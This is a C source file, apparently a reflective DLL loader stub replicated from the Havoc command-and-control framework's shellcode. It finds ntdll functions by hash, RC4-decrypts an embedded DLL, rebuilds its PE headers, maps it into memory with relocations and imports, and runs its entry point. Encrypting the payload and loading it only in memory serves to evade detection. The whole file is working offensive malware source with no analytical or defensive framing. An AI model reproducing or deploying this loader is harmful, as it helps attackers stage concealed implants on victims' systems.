/**
 * Entry.c - Replicated from Havoc Shellcode
 */

#include <Core.h>
#include <Win32.h>

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

SEC( text, B ) VOID Entry( LPVOID pDllBase )
{
    INSTANCE                Instance        = { 0 };
    PIMAGE_DOS_HEADER       DosHeader       = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID volatile         KVirtualMemory  = NULL;
    PVOID                   pNewDll         = NULL;
    SIZE_T                  KMemSize        = 0;
    DWORD                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    SIZE_T                  SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };

    Instance.Modules.Ntdll  = LdrModulePeb( NTDLL_HASH );

    Instance.Win32.LdrLoadDll              = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.NtAllocateVirtualMemory = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
    Instance.Win32.NtFreeVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );

    // ========================================
    // Phase 1: Decrypt DLL
    // ========================================
    PBYTE   pData       = (PBYTE) pDllBase;
    BYTE    Rc4Key[2]   = { pData[0], pData[1] };
    DWORD   DecryptSize = *(DWORD*)( pData + 2 );
    DWORD   CopySize    = DecryptSize + 6;
    SIZE_T  DllSize     = (SIZE_T)CopySize;

    if ( !NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &pNewDll, 0, &DllSize, MEM_COMMIT, PAGE_READWRITE ) ) )
        return;

    MemCopy( pNewDll, pData, CopySize );
    Rc4( (PBYTE)pNewDll + 6, DecryptSize, Rc4Key, 2 );

    // ========================================
    // Phase 2: Restore PE headers
    // ========================================
    ((PBYTE)pNewDll)[0] = 'M';
    ((PBYTE)pNewDll)[1] = 'Z';

    DosHeader = (PIMAGE_DOS_HEADER) pNewDll;
    NtHeaders = C_PTR( U_PTR(pNewDll) + DosHeader->e_lfanew );

    // Restore original [2:6] from TimeDateStamp
    DWORD SavedBytes = NtHeaders->FileHeader.TimeDateStamp;
    *(DWORD*)( (PBYTE)pNewDll + 2 ) = SavedBytes;

    // ========================================
    // Phase 3: Determine mapping mode
    // ========================================
    BOOL MapHeaders = ( DosHeader->e_oemid == 0 );

    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );

    if ( MapHeaders )
    {
        KHdrSize = 0;
        KMemSize = NtHeaders->OptionalHeader.SizeOfImage;
    }
    else
    {
        KHdrSize = SecHeader[ 0 ].VirtualAddress;
        KMemSize = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
    }

    // ========================================
    // Phase 4: Map DLL into virtual memory
    // ========================================
    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        KaynArgs.KaynLdr   = (PVOID)( ( (ULONG_PTR)pDllBase ) & ( ~( PAGE_SIZE - 1 ) ) );
        KaynArgs.DllCopy   = pNewDll;
        KaynArgs.Demon     = KVirtualMemory;
        KaynArgs.DemonSize = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;

        // Copy PE headers when CRT compatible mode
        if ( MapHeaders )
            MemCopy( KVirtualMemory, pNewDll, SecHeader[ 0 ].VirtualAddress );

        // Copy sections
        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ),
                C_PTR( U_PTR(pNewDll) + SecHeader[ i ].PointerToRawData ),
                SecHeader[ i ].SizeOfRawData
            );
        }

        // Relocations
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( KVirtualMemory, C_PTR( NtHeaders->OptionalHeader.ImageBase ), C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

        // Import table resolution
        KaynLdrImport( &Instance, KVirtualMemory, NtHeaders, KHdrSize );

        // Set memory protection
        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            {
                Protection = PAGE_EXECUTE_READ;
                KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
                KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
            }

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // Execute entry point (DllMain or DllMainCRTStartup)
        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
    }
}

SEC( text, C ) VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}

SEC( text, D ) VOID Rc4( PBYTE Data, DWORD DataLen, PBYTE Key, DWORD KeyLen )
{
      BYTE S[256];
      BYTE tmp;
      DWORD i, j = 0;

      for (i = 0; i < 256; i++)
          S[i] = (BYTE)i;

      for (i = 0; i < 256; i++) {
          j = (j + S[i] + Key[i % KeyLen]) & 0xFF;
          tmp = S[i]; S[i] = S[j]; S[j] = tmp;
      }

      i = j = 0;
      for (DWORD k = 0; k < DataLen; k++) {
          i = (i + 1) & 0xFF;
          j = (j + S[i]) & 0xFF;
          tmp = S[i]; S[i] = S[j]; S[j] = tmp;
          Data[k] ^= S[(S[i] + S[j]) & 0xFF];
      }
}
